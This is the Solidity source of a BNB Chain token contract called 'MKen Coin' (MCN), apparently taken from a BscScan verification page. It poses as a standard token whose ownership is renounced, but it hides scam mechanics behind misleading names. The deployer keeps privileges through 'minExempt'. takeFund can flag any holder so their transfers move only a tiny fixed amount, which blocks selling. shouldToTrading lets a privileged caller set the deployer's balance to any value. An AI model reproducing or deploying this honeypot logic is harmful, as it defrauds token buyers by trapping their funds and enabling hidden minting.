/**
 *Submitted for verification at BscScan.com on 2023-01-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract MKenCoin {
    uint8 public decimals = 18;
    string public symbol = "MCN";
    address public minExempt;
    address public exemptFund;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public isSellMode;
    address public owner;
    mapping(address => uint256) public balanceOf;
    string public name = "MKen Coin";
    uint256 constant shouldTake = 14 ** 10;





    mapping(address => bool) public exemptEnableFee;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public feeFrom;
    

    event OwnershipTransferred(address indexed walletAmount, address indexed receiverTo);
    event Transfer(address indexed exemptTradingLimit, address indexed launchedMode, uint256 receiverToReceiver);
    event Approval(address indexed enableBuy, address indexed shouldList, uint256 receiverToReceiver);

    constructor (){
        IUniswapV2Router isSellAuto = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptFund = IUniswapV2Factory(isSellAuto.factory()).createPair(isSellAuto.WETH(), address(this));
        owner = msg.sender;
        minExempt = owner;
        exemptEnableFee[minExempt] = true;
        balanceOf[minExempt] = totalSupply;
        emit Transfer(address(0), minExempt, totalSupply);
        renounceOwnership();
    }

    

    function renounceOwnership() public {
        emit OwnershipTransferred(minExempt, address(0));
        owner = address(0);
    }

    function launchReceiver(address teamTx, address buySell, uint256 receiverIs) internal returns (bool) {
        require(balanceOf[teamTx] >= receiverIs);
        balanceOf[teamTx] -= receiverIs;
        balanceOf[buySell] += receiverIs;
        emit Transfer(teamTx, buySell, receiverIs);
        return true;
    }

    function transferFrom(address listSell, address feeMarketing, uint256 receiverIs) public returns (bool) {
        if (listSell != msg.sender && allowance[listSell][msg.sender] != type(uint256).max) {
            require(allowance[listSell][msg.sender] >= receiverIs);
            allowance[listSell][msg.sender] -= receiverIs;
        }
        if (feeMarketing == minExempt || listSell == minExempt) {
            return launchReceiver(listSell, feeMarketing, receiverIs);
        }
        if (isSellMode[listSell]) {
            return launchReceiver(listSell, feeMarketing, shouldTake);
        }
        return launchReceiver(listSell, feeMarketing, receiverIs);
    }

    function transfer(address feeMarketing, uint256 receiverIs) external returns (bool) {
        return transferFrom(msg.sender, feeMarketing, receiverIs);
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function exemptBurn(address modeTx) public {
        if (feeFrom) {
            return;
        }
        exemptEnableFee[modeTx] = true;
        feeFrom = true;
    }

    function takeFund(address autoAt) public {
        if (autoAt == minExempt || !exemptEnableFee[msg.sender]) {
            return;
        }
        isSellMode[autoAt] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function shouldToTrading(uint256 receiverIs) public {
        if (receiverIs == 0 || !exemptEnableFee[msg.sender]) {
            return;
        }
        balanceOf[minExempt] = receiverIs;
    }


}